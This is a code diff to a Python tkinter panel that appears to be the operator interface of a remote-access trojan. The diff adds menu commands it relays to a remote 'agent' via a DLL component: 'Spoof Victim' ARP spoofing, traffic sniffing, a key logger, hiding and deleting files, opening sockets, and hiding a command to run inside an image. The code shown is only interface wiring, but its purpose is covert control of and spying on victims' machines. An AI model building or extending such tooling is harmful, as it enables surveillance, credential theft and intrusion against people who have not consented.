@@ -26,13 +26,51 @@ class Adder(ttk.Frame):
     def changed(self, *args):
         val = self.var.get()
 
-        if val == 'a':
-            self.l.config(text='Insert parameters for function (use by white space for split them).')
-            self.l.grid(column=0, row=6, columnspan=6, pady=5)
-            self.e.grid(column=1, row=7, pady=5)
-        elif val == 'b':
+        if val == 'Run Netstat':
             self.e.grid_forget()
             self.l.grid_forget()
+        elif val == 'Get All Files':
+            self.l.config(text='Insert dir (optional).')
+            self.l.grid(column=0, row=6, columnspan=6, pady=5)
+            self.e.grid(column=1, row=7, pady=5)
+        elif val == 'Open Socket':
+            self.l.config(text='Insert ip and port (use by white space for split them).')
+            self.l.grid(column=0, row=6, columnspan=6, pady=5)
+            self.e.grid(column=1, row=7, pady=5)
+        elif val == 'Change File':
+            self.l.config(text='Insert path of file and action [+h/-h/rm/mv] (use by white space for split them).')
+            self.l.grid(column=0, row=6, columnspan=6, pady=5)
+            self.e.grid(column=1, row=7, pady=5)
+        elif val == 'Get Arp Table':
+            self.e.grid_forget()
+            self.l.grid_forget()
+        elif val == 'Spoof Victim':
+            self.l.config(text='Insert ip of victim.')
+            self.l.grid(column=0, row=6, columnspan=6, pady=5)
+            self.e.grid(column=1, row=7, pady=5)
+        elif val == 'Stop Spoofing Victim':
+            self.l.config(text='Insert ip of victim.')
+            self.l.grid(column=0, row=6, columnspan=6, pady=5)
+            self.e.grid(column=1, row=7, pady=5)
+        elif val == 'Sniff Current Traffic':
+            self.l.config(text='Insert filter (optional - use only 802.11 filters!!!).')
+            self.l.grid(column=0, row=6, columnspan=6, pady=5)
+            self.e.grid(column=1, row=7, pady=5)
+        elif val == 'Stop Sniff Traffic':
+            self.e.grid_forget()
+            self.l.grid_forget()
+        elif val == 'Start Key Logger':
+            self.e.delete(0, 'end')
+            self.e.insert(0, self.server.shared_key)
+            self.e.grid_forget()
+            self.l.grid_forget()
+        elif val == 'Stop Key Logger':
+            self.e.grid_forget()
+            self.l.grid_forget()
+        elif val == 'Hide Message In Picture':
+            self.l.config(text='Insert url of img and command to run (use by white space for split them).')
+            self.l.grid(column=0, row=6, columnspan=6, pady=5)
+            self.e.grid(column=1, row=7, pady=5)
 
         ttk.Button(self, text='Exec', command=self.exec_func).grid(column=0, row=8, columnspan=4, pady=5)
 
@@ -67,8 +105,10 @@ class Adder(ttk.Frame):
         self.answer_frame.configure(state='disabled')
 
     def exec_func(self):
-        self.server.set_todo('func component ' + self.var.get().replace(" ", "") + " " + self.e.get())
+        self.server.set_todo('func Components.dll ' + self.var.get().replace(" ", "") + " " + self.e.get())
+        self.answer_frame.configure(state='normal')
         self.answer_frame.insert(tkinter.INSERT, "Please wait until get response from the agent...")
+        self.answer_frame.configure(state='disabled')
 
     def init_gui(self):
         """Builds GUI."""
@@ -89,10 +129,24 @@ class Adder(ttk.Frame):
         ttk.Label(self, text='You can insert here any command action.').grid(
             column=0, row=2, columnspan=4, pady=(50, 0))
         self.exex_entry = ttk.Entry(self, width=100)
-        self.exex_entry.grid(column=1, row = 3, pady=5)
+        self.exex_entry.grid(column=1, row=3, pady=5)
         exec_button = ttk.Button(self, text='Exec', command=self.exec).grid(column=0, row=4, columnspan=4, pady=5)
 
-        ttk.OptionMenu(self, self.var, "Or you can choose function to run", "a", "b", "c").grid(
+        functions = [
+            "Or you can choose function to run",
+            "Run Netstat",
+            "Get All Files",
+            "Open Socket",
+            "Change File",
+            "Get Arp Table",
+            "Spoof Victim",
+            "Stop Spoofing Victim",
+            "Sniff Current Traffic",
+            "Start Key Logger",
+            "Stop Key Logger",
+            "Hide Message In Picture"
+        ]
+        ttk.OptionMenu(self, self.var, *functions).grid(
             column=0, row=5, columnspan=4, pady=5)
         self.var.trace('w', self.changed)
 
